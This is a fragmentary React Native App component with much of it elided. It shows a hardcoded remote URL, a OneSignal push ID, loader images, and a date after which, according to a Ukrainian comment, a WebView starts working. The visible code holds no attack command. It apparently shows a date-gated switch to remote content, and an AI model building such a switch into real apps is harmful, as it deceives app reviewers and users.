...
const App = () => {
  ...
  const INITIAL_URL = `https://breathtaking-towering-mirth.space/`;
  const URL_IDENTIFAIRE = `3DHYlpQt`;
  ...
  OneSignal.initialize('3cbef647-336b-4f72-9fa7-8ae7aa1a009e');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2025-05-08T13:00:00'); //дата з якої поч працювати webView
            ...
            <NavigationContainer>
                  {!louderIsEnded || !aceptTransperency || !completeLink ? (
                        <View
                              ...
                              <Animated.Image
                                    source={require('./fluffyApp/appAssets/fluffyLoaders/appLoader1.png')}
                                    style={{
                                          //...props.style,
                              ...
                              />
                              <Animated.Image
                                    source={require('./fluffyApp/appAssets/fluffyLoaders/appLoader2.png')}
                                    style={{
                                          //...props.style,
